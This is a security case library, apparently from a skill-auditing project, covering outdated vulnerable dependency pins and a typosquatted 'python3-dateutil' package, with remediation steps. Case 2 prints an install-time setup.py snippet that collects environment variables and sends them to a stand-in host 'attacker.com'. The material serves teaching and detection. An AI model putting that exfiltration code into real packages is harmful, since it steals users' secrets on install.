# Dependency Risk - Case Library

> This file records typical problem examples of dependency risks
> 
> **References**: CWE-1035, CWE-1104, PyUp Safety DB, Snyk, CVE

---

## Case 1: Using Old Dependencies with Known CVEs

**Source**: CVE-2021-44228 (Log4Shell-like case), CWE-1035

### Skill Info
- **Skill Name**: pdf-processor-2.0.0
- **Skill Category**: file-processing
- **Test Scenario**: PDF file parsing

### Problem Description
Skill depends on an old version of `PyPDF2==1.26.0`, which has a known Denial of Service vulnerability (CVE-2018-18082). Attackers can construct malicious PDFs to cause infinite loops or memory exhaustion.

### Problem Dependency
```txt
# requirements.txt
PyPDF2==1.26.0  # ⚠️ Has CVE-2018-18082
requests==2.19.0  # ⚠️ Has multiple CVEs including SSRF
```

### Risk Demo
```python
# Attacker constructs malicious PDF
from PyPDF2 import PdfFileReader

# Malicious PDF contains infinite loop references
malicious_pdf = open('attack.pdf', 'rb')
reader = PdfFileReader(malicious_pdf)
reader.getPage(0)  # Causes infinite loop, 100% CPU
```

### Remediation
```txt
# requirements.txt
PyPDF2>=3.0.0  # Upgrade to safe version
requests>=2.31.0  # Upgrade to safe version
```

```python
# Use safety to check dependencies
# $ safety check -r requirements.txt

# Use pip-audit
# $ pip-audit -r requirements.txt
```

### Detection Result
- **Severity**: 🔴 Critical (P0)
- **CVE Mapping**: CVE-2018-18082, CVE-2023-...(requests)
- **CWE Mapping**: CWE-1035, CWE-1104
- **Fix Status**: ✅ Fixed

---

## Case 2: Dependency Typosquatting Attack

**Source**: Real PyPI poisoning incidents (2022-2023)

### Skill Info
- **Skill Name**: data-analyzer-1.0.0
- **Skill Category**: data-processing
- **Test Scenario**: Data visualization

### Problem Description
Skill depends on `python3-dateutil` package (misspelled), which is a malicious poisoned package. The real package name is `python-dateutil`. Installing it executes malicious code in the background.

### Problem Dependency
```txt
# requirements.txt
python3-dateutil==0.1  # ⚠️ Malicious poisoned package! Correct is python-dateutil
```

### Risk Demo
```python
# Code executed during malicious package installation (setup.py)
import os
import socket
import subprocess

def post_install():
    # Steal environment variables
    env_data = str(os.environ)
    
    # Send to attacker server
    s = socket.socket()
    s.connect(("attacker.com", 9999))
    s.send(env_data.encode())
    s.close()

post_install()
```

### Remediation
```txt
# requirements.txt
python-dateutil>=2.8.2  # Correct package name
```
